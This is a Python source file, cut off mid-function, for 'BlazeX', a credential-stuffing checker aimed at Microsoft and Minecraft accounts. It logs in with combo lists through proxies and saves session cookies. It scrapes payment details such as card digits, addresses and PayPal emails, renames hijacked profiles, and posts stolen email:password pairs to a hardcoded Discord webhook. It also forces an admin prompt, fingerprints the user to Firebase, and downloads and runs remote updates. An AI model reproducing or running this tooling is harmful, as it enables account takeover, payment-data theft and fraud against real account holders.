import pyrebase
import requests
import uuid
from packaging import version
import os
import sys
import time
import re
import readchar
import threading
import random
import urllib3
import json
import concurrent.futures
import warnings
import socket
import socks
import string
from datetime import datetime, timezone
from colorama import Fore
from console import utils
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar
import tempfile
import shutil
import ctypes

# Ban checking imports
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound
from minecraft.exceptions import LoginDisconnect

# Firebase configuration
firebase_config = {
    "apiKey": "AIzaSyAb_Uvev5oG2TrYc-RHLlT1qNM_k4OkxKk",
    "authDomain": "blazexstocker.firebaseapp.com",
    "databaseURL": "https://blazexstocker-default-rtdb.asia-southeast1.firebasedatabase.app/",
    "storageBucket": "blazexstocker.firebasestorage.app",
}

# Initialize Firebase
try:
    firebase = pyrebase.initialize_app(firebase_config)
    db = firebase.database()
except Exception as e:
    print(Fore.RED + f"Firebase initialization failed: {e}")
    sys.exit(1)

# Current version of the script
VERSION = "1.1.0"

logo = Fore.CYAN + '''
 ██████╗ ██╗      █████╗  ███████╗  ███████╗     ██╗  ██╗
 ██╔══██╗██║     ██╔══██╗ ╚══███╔╝  ██╔════╝     ╚██╗██╔╝
 ██████╔╝██║     ███████║   ███╔╝   █████╗        ╚███╔╝ 
 ██╔══██╗██║     ██╔══██║  ███╔╝    ██╔══╝        ██╔██╗ 
 ██████╔╝██████╗ ██║  ██║ ███████╗  ███████╗     ██╔╝  ██╗
 ╚═════╝ ╚═════╝╚═╝  ╚═╝ ╚══════╝  ╚══════╝     ╚═╝   ╚═╝   ~ The Ultimate Blaze Checker! 
   Support: Telegram @HarshOGG or @sarthakog [t.me/blaze_cloud] 
            Discord @harshhhh_og or @sarthakkul  [discord.gg/blazecloud] '''

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
results_dir = None
RESTOCKER_NAME = "Restocker 1"  # Hardcoded restocker name
hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# Decoding dictionary for the substitution cipher
decode_dict = {
    "%aD$": "A", "#K3!": "B", "@w2&": "C", "]4G^": "D", "!Yz9": "E", "*Pq7": "F", "$1jR": "G", "^xM#": "H",
    "&N@0": "I", "(cT$": "J", "~vE%": "K", "+3Z)": "L", "?rH{": "M", "`mB]": "N", "/tF*": "O", "=2u(": "P",
    "|Sa5": "Q", "<gJ!": "R", ">Lb4": "S", ";oV$": "T", ":nW^": "U", ",Xe@": "V", ".kI#": "W", "0Qi%": "X",
    "9Uh)": "Y", "8Cy(": "Z",
    "7Az_": "a", "6Rv+": "b", "5Md#": "c", "4Tp!": "d", "3Bo&": "e", "2Nc$": "f", "1Yl^": "g", "0Kj*": "h",
    "ZWq~": "i", "YFe(": "j", "XDt)": "k", "VGi_": "l", "USa{": "m", "TMb[": "n", "RCo]": "o", "QPn+": "p",
    "OKv/": "q", "NJu|": "r", "MIl>": "s", "LHw<": "t", "KGe:": "u", "JBf;": "v", "IEd,": "w", "Hc@.": "x",
    "Gba0": "y", "FZ91": "z",
    "eX+3": "0", "dW$4": "1", "cV!5": "2", "bU#6": "3", "aT^7": "4", "ZS&8": "5", "YR*9": "6", "XQ(0": "7",
    "WP)1": "8", "VO_2": "9",
    "nzio": "!", "m@s4": "@", "l#t5": "#", "k$u6": "$", "j%v7": "%", "i^w8": "^", "h&x9": "&", "g*y0": "*",
    "f(z1": "(", "e)a2": ")", "d-b3": "-", "c_c4": "_", "b+a5": "+", "a=b6": "=", "Z{c7": "{", "Y}d8": "}",
    "X[e9": "[", "W]f0": "]", "V|g1": "|", "U\\h2": "\\", "T:i3": ":", "S;j4": ";", 'R"k5': '"', "Q'l6": "'",
    "P<m7": "<", "O>n8": ">", "N,o9": ",", "M.p0": ".", "L?q1": "?", "K/r2": "/", "J`s3": "`"
}

def decode_combo(coded_combo):
    """Decode a coded combo string using the decode_dict."""
    decoded = ''
    try:
        for i in range(0, len(coded_combo), 4):
            chunk = coded_combo[i:i+4]
            if chunk in decode_dict:
                decoded += decode_dict[chunk]
            else:
                raise ValueError(f"Invalid code sequence: {chunk}")
        return decoded
    except Exception as e:
        print(Fore.YELLOW + f"Decode error: {e}")
        return None

def get_mac():
    return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])

def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print(Fore.YELLOW + "Requesting administrator privileges...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

def check_passkey():
    mac = get_mac()
    ip = get_ip()
    passkey = input("Enter passkey: ")
    try:
        allowed = db.child("allowed_passkeys").child(passkey).get().val()
        if not allowed:
            print(Fore.RED + "Invalid passkey.")
            sys.exit(1)
        passkey_data = db.child("passkeys").child(passkey).get().val()
        if passkey_data:
            if passkey_data["mac"] != mac:
                try:
                    os.remove(__file__)
                except:
                    pass
                db.child("alerts").push({
                    "passkey": passkey,
                    "mac": mac,
                    "ip": ip,
                    "timestamp": time.time()
                })
                print(Fore.RED + "Passkey already used on another device. Script will self-destruct.")
                sys.exit(1)
        else:
            db.child("passkeys").child(passkey).set({"mac": mac})
        db.child("logs").push({
            "passkey": passkey,
            "mac": mac,
            "ip": ip,
            "timestamp": time.time()
        })
    except Exception as e:
        print(Fore.RED + f"Passkey check failed: {e}")
        sys.exit(1)

def check_for_updates():
    try:
        latest_version = db.child("latest_version").get().val()
        if latest_version is None:
            print(Fore.YELLOW + "Failed to retrieve latest_version from Firebase.")
            return
        print(f"Latest version from Firebase: {latest_version}")
        print(f"Current version: {VERSION}")
        try:
            if version.parse(latest_version) > version.parse(VERSION):
                print("Update available.")
                download_url = db.child("download_url").get().val()
                if download_url is None:
                    print(Fore.YELLOW + "Failed to retrieve download_url from Firebase.")
                    return
                print(f"Download URL: {download_url}")
                try:
                    response = requests.get(download_url, timeout=10)
                    response.raise_for_status()
                    new_script = response.text
                    if not new_script.strip():
                        print(Fore.YELLOW + "Downloaded script is empty.")
                        return
                except requests.exceptions.RequestException as e:
                    print(Fore.YELLOW + f"Failed to download new script: {e}")
                    return
                script_path = os.path.abspath(__file__)
                temp_file = os.path.join(os.path.dirname(script_path), "BlazeXStocker_tmp.py")
                with open(temp_file, "w", encoding='utf-8') as f:
                    f.write(new_script)
                if not os.path.exists(temp_file) or os.path.getsize(temp_file) == 0:
                    print(Fore.YELLOW + "Temporary file not created or empty.")
                    try:
                        os.remove(temp_file)
                    except:
                        pass
                    return
                if not os.path.exists(script_path):
                    print(Fore.YELLOW + f"Script path does not exist: {script_path}")
                    try:
                        os.remove(temp_file)
                    except:
                        pass
                    return
                if not os.access(script_path, os.W_OK):
                    print(Fore.YELLOW + "No write permission for the script file.")
                    try:
                        os.remove(temp_file)
                    except:
                        pass
                    return
                try:
                    os.rename(temp_file, script_path)
                    print("Overwrote the script file.")
                    os.execl(sys.executable, sys.executable, script_path, *sys.argv[1:])
                except Exception as e:
                    print(Fore.YELLOW + f"Failed to rename temporary file: {e}")
                    try:
                        os.remove(temp_file)
                    except:
                        pass
            else:
                print("No update needed.")
        except Exception as e:
            print(Fore.YELLOW + f"Version comparison failed: {e}")
    except Exception as e:
        print(Fore.YELLOW + f"Update check failed: {e}")

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

# Hardcoded configuration settings
config.set('webhook', 'https://discord.com/api/webhooks/1379631813932224634/c5QCIgiRGK4AmKjLkXBM1vNZjVePeqhXvETf2CT1p6NlOpTOb_3I3hXdd_g4G1Rx3U2w')
config.set('banned_webhook', 'paste banned accounts webhook')
config.set('unbanned_webhook', 'paste unbanned accounts webhook')
config.set('embed', True)
config.set('MESSAGE', '''@everyone HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>''')
config.set('proxylessban', True)
config.set('log', False)
config.set('autoscrape', 5)
config.set('setname', True)
config.set('name', 'BlazeX by HarshOGG and SteveOG')
config.set('setskin', True)
config.set('skin', 'https://s.namemc.com/i/bc8429d1f2e15539.png')
config.set('variant', 'classic')
config.set('hypixelname', True)
config.set('hypixellevel', True)
config.set('hypixelfirstlogin', True)
config.set('hypixellastlogin', True)
config.set('optifinecape', True)
config.set('mcapes', True)
config.set('access', True)
config.set('hypixelsbcoins', True)
config.set('hypixelbwstars', True)
config.set('hypixelban', True)
config.set('namechange', True)
config.set('lastchanged', True)
config.set('payment', True)

maxretries = 5

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl: message += f"\n-Agama: {self.hypixl}"
        if self.level: message += f"\nHypixel Level: {self.level}"
        if self.firstlogin: message += f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin: message += f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape: message += f"\nOptifine Cape: {self.cape}"
        if self.access: message += f"\nEmail Access: {self.access}"
        if self.sbcoins: message += f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars: message += f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban'): message += f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged: message += f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged: message += f"\nLast Name Change: {self.lastchanged}"
        return message

    def notify(self):
        global errors
        try:
            webhook_url = config.get('webhook') if str(self.banned).lower() == "false" else config.get('banned_webhook')
            if config.get('embed'):
                payload = {
                    "username": "🉑・ BlazeCloud - The Best Cloud!",
                    "avatar_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp?ex=68472fd9&is=6845de59&hm=c5abf6b47608d0e43880eb7fa84b3db8762a5b7b738befe11999d2fdc50ce655&",
                    "embeds": [{
                        "author": {
                            "name": "📈・ BlazeCloud Minecraft Hits!",
                            "url": "https://discord.gg/blazexcloud",
                            "icon_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp?ex=68472fd9&is=6845de59&hm=c5abf6b47608d0e43880eb7fa84b3db8762a5b7b738befe11999d2fdc50ce655&"
                        },
                        "title": self.name,
                        "color": 3821605,
                        "fields": [
                            {"name": "📧 Email", "value": f"||{self.email}||", "inline": True},
                            {"name": "🔑 Password", "value": f"||{self.password}||", "inline": True},
                            {"name": "⛔ Banned", "value": f"{self.banned or 'Unknown'}", "inline": True},
                            {"name": "🎮 Hypixel Name", "value": self.hypixl or "N/A", "inline": True},
                            {"name": "🔄 Can Change Name", "value": self.namechanged or "N/A", "inline": True},
                            {"name": "📊 Hypixel Level", "value": self.level or "N/A", "inline": True},
                            {"name": "🦸 Capes", "value": f"{self.capes or 'None'} | Optifine: {self.cape or 'No'}", "inline": True},
                            {"name": "🎯 Account Type", "value": self.type or "N/A", "inline": True},
                            {"name": "🛡️ Combo", "value": f"||{self.email}:{self.password}||", "inline": True},
                        ],
                        "thumbnail": {"url": f"https://visage.surgeplay.com/bust/{self.name}?y=-40&quality=lossless"},
                        "footer": {
                            "text": f"🪐・ Hits By .gg/blazecloud - Checked by {RESTOCKER_NAME}",
                            "icon_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp?ex=68472fd9&is=6845de59&hm=c5abf6b47608d0e43880eb7fa84b3db8762a5b7b738befe11999d2fdc50ce655&"
                        }
                    }]
                }
            else:
                content = config.get('MESSAGE') \
                    .replace("<email>", self.email) \
                    .replace("<password>", self.password) \
                    .replace("<name>", self.name or "N/A") \
                    .replace("<hypixel>", self.hypixl or "N/A") \
                    .replace("<level>", self.level or "N/A") \
                    .replace("<firstlogin>", self.firstlogin or "N/A") \
                    .replace("<lastlogin>", self.lastlogin or "N/A") \
                    .replace("<ofcape>", self.cape or "N/A") \
                    .replace("<capes>", self.capes or "N/A") \
                    .replace("<access>", self.access or "N/A") \
                    .replace("<skyblockcoins>", self.sbcoins or "N/A") \
                    .replace("<bedwarsstars>", self.bwstars or "N/A") \
                    .replace("<banned>", self.banned or "Unknown") \
                    .replace("<namechange>", self.namechanged or "N/A") \
                    .replace("<lastchanged>", self.lastchanged or "N/A") \
                    .replace("<type>", self.type or "N/A") + f" - Checked by {RESTOCKER_NAME}"
                payload = {"content": content, "username": "BlazeX by HarshOGG and SteveOG"}
            requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=10)
        except Exception as e:
            errors += 1
            print(Fore.YELLOW + f"Notification failed: {e}")

    def hypixel(self):
        global errors
        try:
            if any(config.get(key) for key in ['hypixelname', 'hypixellevel', 'hypixelfirstlogin', 'hypixellastlogin', 'hypixelbwstars']):
                tx = requests.get(f'https://plancke.io/hypixel/player/stats/{self.name}', proxies=getproxy(), headers={'User-Agent': 'Mozilla/5.0'}, verify=False, timeout=10).text
                if config.get('hypixelname'):
                    self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group() or "N/A"
                if config.get('hypixellevel'):
                    self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group() or "N/A"
                if config.get('hypixelfirstlogin'):
                    self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group() or "N/A"
                if config.get('hypixellastlogin'):
                    self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group() or "N/A"
                if config.get('hypixelbwstars'):
                    self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group() or "N/A"
            if config.get('hypixelsbcoins'):
                req = requests.get(f"https://sky.shiiyu.moe/stats/{self.name}", proxies=getproxy(), verify=False, timeout=10)
                self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group() or "N/A"
        except Exception as e:
            errors += 1
            print(Fore.YELLOW + f"Hypixel check failed: {e}")

    def optifine(self):
        if config.get('optifinecape'):
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False, timeout=5).text
                self.cape = "No" if "Not found" in txt else "Yes"
            except:
                self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access'):
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False, timeout=10).text)
                if out.get("Success") == 1:
                    self.access = "True"
                    mfa += 1
                    with open(os.path.join(results_dir, "MFA.txt"), 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
                else:
                    self.access = "False"
                    sfa += 1
                    with open(os.path.join(results_dir, "SFA.txt"), 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
            except:
                self.access = "Unknown"

    def namechange(self):
        if config.get('namechange') or config.get('lastchanged'):
            tries = 0
            while tries < maxretries:
                try:
                    check = self.session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, timeout=5)
                    if check.status_code == 200:
                        data = check.json()
                        if config.get('namechange'):
                            self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                        if config.get('lastchanged') and data.get('createdAt'):
                            created_at = data['createdAt']
                            try:
                                given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                            except ValueError:
                                given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                            given_date = given_date.replace(tzinfo=timezone.utc)
                            formatted = given_date.strftime("%m/%d/%Y")
                            current_date = datetime.now(timezone.utc)
                            difference = current_date - given_date
                            years = difference.days // 365
                            months = (difference.days % 365) // 30
                            days = difference.days
                            if years > 0:
                                self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                            elif months > 0:
                                self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                            else:
                                self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                        break
                    elif check.status_code == 429:
                        time.sleep(3 if len(proxylist) < 5 else 1)
                    else:
                        break
                except:
                    tries += 1
                    retries += 1

    def save_cookies(self, type):
        try:
            cfname = os.path.join(results_dir, 'Cookies')
            os.makedirs(cfname, exist_ok=True)
            bfname = os.path.join(cfname, type)
            os.makedirs(bfname, exist_ok=True)
            cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
            jar = MozillaCookieJar(cookie_file_path)
            for cookie in self.session.cookies:
                jar.set_cookie(cookie)
            jar.save(ignore_discard=True)
            with open(cookie_file_path, 'r') as file:
                lines = file.readlines()[3:]
            while lines and not lines[0].strip():
                lines.pop(0)
            with open(cookie_file_path, 'w') as file:
                file.writelines(lines)
        except Exception as e:
            print(Fore.YELLOW + f"Cookie save failed: {e}")

    def ban(self, session):
        global errors
        if config.get('hypixelban'):
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                try:
                    connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})

                    @connection.listener(clientbound.login.DisconnectPacket, early=True)
                    def login_disconnect(packet):
                        data = json.loads(str(packet.json_data))
                        if "Suspicious activity" in str(data):
                            self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        elif "temporarily banned" in str(data):
                            self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        elif "You are permanently banned from this server!" in str(data):
                            self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        elif "The Hypixel Alpha server is currently closed!" in str(data) or "Failed cloning your SkyBlock data" in str(data):
                            self.banned = "False"
                        else:
                            self.banned = ''.join(item["text"] for item in data["extra"])
                        with open(os.path.join(results_dir, "Banned.txt" if self.banned != "False" else "Unbanned.txt"), 'a') as f:
                            f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned' if self.banned != "False" else 'Unbanned')

                    @connection.listener(clientbound.play.JoinGamePacket, early=True)
                    def joined_server(packet):
                        if self.banned is None:
                            self.banned = "False"
                            with open(os.path.join(results_dir, "Unbanned.txt"), 'a') as f:
                                f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')

                    if len(banproxies) > 0:
                        proxy = random.choice(banproxies)
                        if '@' in proxy:
                            user_pass, ip_port = proxy.split('@')
                            user, passw = user_pass.split(':')
                            ip, port = ip_port.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip, port=int(port), username=user, password=passw)
                        else:
                            ip, port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip, port=int(port))
                        socket.socket = socks.socksocket

                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    connection.connect()
                    c = 0
                    while self.banned is None and c < 1000:
                        time.sleep(0.01)
                        c += 1
                    connection.disconnect()
                    sys.stderr = original_stderr
                    if self.banned is not None:
                        break
                except Exception as e:
                    errors += 1
                    print(Fore.YELLOW + f"Ban check failed: {e}")
                tries += 1

    def setname(self):
        newname = ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)) + "_" + config.get('name') + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=3))
        tries = 0
        while tries < maxretries:
            try:
                changereq = self.session.put(f"https://api.minecraftservices.com/minecraft/profile/name/{newname}", headers={'Authorization': f'Bearer {self.token}'}, timeout=5)
                if changereq.status_code == 200:
                    self.type += " [SET MC]"
                    self.name += f" -> {newname}"
                    break
                elif changereq.status_code == 429:
                    time.sleep(3)
                tries += 1
            except:
                tries += 1

    def setskin(self):
        tries = 0
        while tries < maxretries:
            try:
                data = {"url": config.get('skin'), "variant": config.get('variant')}
                changereq = self.session.post("https://api.minecraftservices.com/minecraft/profile/skins", json=data, headers={'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'}, timeout=5)
                if changereq.status_code == 200:
                    self.type += " [SET SKIN]"
                    break
                elif changereq.status_code == 429:
                    time.sleep(3)
                tries += 1
            except:
                tries += 1

    def handle(self, session):
        global hits
        try:
            if self.name != 'N/A':
                self.hypixel()
                self.optifine()
                self.full_access()
                self.namechange()
                self.ban(session)
                capes_folder = os.path.join(results_dir, 'Capes')
                os.makedirs(capes_folder, exist_ok=True)
                if self.capes:
                    capes_list = self.capes.split(", ")
                    sorted_capes = ", ".join(sorted(capes_list))
                    with open(os.path.join(capes_folder, f"{sorted_capes}.txt"), 'a') as f:
                        f.write(f"{self.email}:{self.password} (Capes: {self.capes})\n")
                    if set(capes_list) - {"Pan", "Common"}:
                        with open(os.path.join(results_dir, "capes.txt"), 'a') as f:
                            f.write(f"{self.email}:{self.password} (Capes: {self.capes})\n")
                if getattr(self, 'namechanged', None) == "True":
                    with open(os.path.join(results_dir, "name_changable.txt"), 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
                if config.get('setname'):
                    self.setname()
            else:
                self.setname()
            if config.get('setskin'):
                self.setskin()
            fullcapt = self.builder()
            if screen == "'2'":
                print(Fore.GREEN + fullcapt.replace('\n', ' | '))
            hits += 1
            with open(os.path.join(results_dir, "Hits.txt"), 'a') as file:
                file.write(f"{self.email}:{self.password}\n")
            with open(os.path.join(results_dir, "Capture.txt"), 'a') as file:
                file.write(fullcapt + "\n============================\n")
            if self.hypixl and self.hypixl != "N/A":
                rank_pattern = r'\[(VIP|MVP|\+{2,}|GM|ADMIN|OWNER|YOUTUBE|PIG\+\+\+|MOJANG|EVENTS|MCP|NPC|LOL|WAT|ADIM|ADMON|JER|JRY|JERRY|SR JERRY|PIG|APPLE|MINISTER|MAYOR|SPECIAL|CRINGblatt|GOD|ANGUS|SLOTH|BETA TESTER|Mixer|MCProHosting|HELPER|MOD|BUILD TEAM|RETIRED)\]'
                matches = re.findall(rank_pattern, self.hypixl)
                if matches:
                    rank = ", ".join([f'[{m}]' for m in matches])
                    with open(os.path.join(results_dir, "rank.txt"), 'a') as f:
                        f.write(f"{self.email}:{self.password} | Rank - {rank} | Ban status - {self.banned or 'Unknown'}\n")
            self.notify()
        except Exception as e:
            print(Fore.YELLOW + f"Handle failed: {e}")

def get_urlPost_sFTTag(session):
    global retries
    while True:
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            sFTTag = re.match(r'.*value="(.+?)".*', text, re.S).group(1)
            urlPost = re.match(r".*urlPost:'(.+?)'.*", text, re.S).group(1)
            return urlPost, sFTTag, session
        except:
            session.proxies = getproxy()
            retries += 1
            time.sleep(1)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True, timeout=15)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True, timeout=15)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm"]):
                twofa += 1
                checked += 1
                cpm += 1
                if screen == "'2'":
                    print(Fore.MAGENTA + f"2FA: {email}:{password}")
                with open(os.path.join(results_dir, "2fa.txt"), 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times"]):
                bad += 1
                checked += 1
                cpm += 1
                if screen == "'2'":
                    print(Fore.RED + f"Bad: {email}:{password}")
                with open(os.path.join(results_dir, "Bad.txt"), 'a') as f:
                    f.write(f"{email}:{password}\n")
                return "None", session
            else:
                session.proxies = getproxy()
                retries += 1
                tries += 1
                time.sleep(1)
        except:
            session.proxies = getproxy()
            retries += 1
            tries += 1
            time.sleep(1)
    bad += 1
    checked += 1
    cpm += 1
    if screen == "'2'":
        print(Fore.RED + f"Bad: {email}:{password}")
    with open(os.path.join(results_dir, "Bad.txt"), 'a') as f:
        f.write(f"{email}:{password}\n")
    return "None", session

def payment(session, email, password):
    global retries
    while True:
        try:
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Referer": "https://account.microsoft.com/"
            }
            r = session.get('https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none', headers=headers, timeout=10)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', ["None"])[0]
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': 'application/json',
                'Authorization': f'MSADELEGATE1.0={token}',
                'Content-Type': 'application/json',
                'Host': 'paymentinstruments.mp.microsoft.com'
            }
            r = session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=10)
            def lr_parse(source, start_delim, end_delim, create_empty=True):
                pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
                match = re.search(pattern, source)
                return match.group(1) if match else ('' if create_empty else None)
            payment_data = {}
            for key, start, end in [
                ('date_registered', '"creationDateTime":"', 'T'),
                ('fullname', '"accountHolderName":"', '"'),
                ('address1', '"address":{"address_line1":"', '"'),
                ('credit_card', 'paymentMethodFamily":"credit_card","display":{"name":"', '"'),
                ('expiry_month', 'expiryMonth":"', '",'),
                ('expiry_year', 'expiryYear":"', '",'),
                ('last4', 'lastFourDigits":"', '",'),
                ('paypal_email', 'email":"', '"'),
                ('balance', 'balance":', ',"')
            ]:
                payment_data[key] = lr_parse(r.text, start, end, create_empty=key not in ['date_registered', 'fullname', 'paypal_email'])
            json_data = json.loads(r.text)
            address_fields = ['city', 'region', 'postal_code', 'cardType', 'country']
            for field in address_fields:
                payment_data[field] = next((item[field] for item in json_data if isinstance(json_data, list) and field in item), json_data.get(field, '')) if isinstance(json_data, list) else json_data.get(field, '')
            user_address = f"[Address: {payment_data['address1']} City: {payment_data['city']} State: {payment_data['region']} Postalcode: {payment_data['postal_code']} Country: {payment_data['country']}]"
            r = session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers, timeout=10)
            subscriptions = []
            for sub_id, prefix in [('ctp', 'ctp:'), ('mdr', 'mdr:')]:
                sub_data = {}
                sub_data['id'] = lr_parse(r.text, f'"subscriptionId":"{prefix}', '"')
                if sub_data['id']:
                    sub_data['auto_renew'] = lr_parse(r.text, f'"subscriptionId":"{prefix}{sub_data["id"]}","autoRenew":', ',')
                    sub_data['start_date'] = lr_parse(r.text, '"startDate":"', 'T')
                    sub_data['next_renewal'] = lr_parse(r.text, '"nextRenewalDate":"', 'T')
                    if prefix == 'mdr':
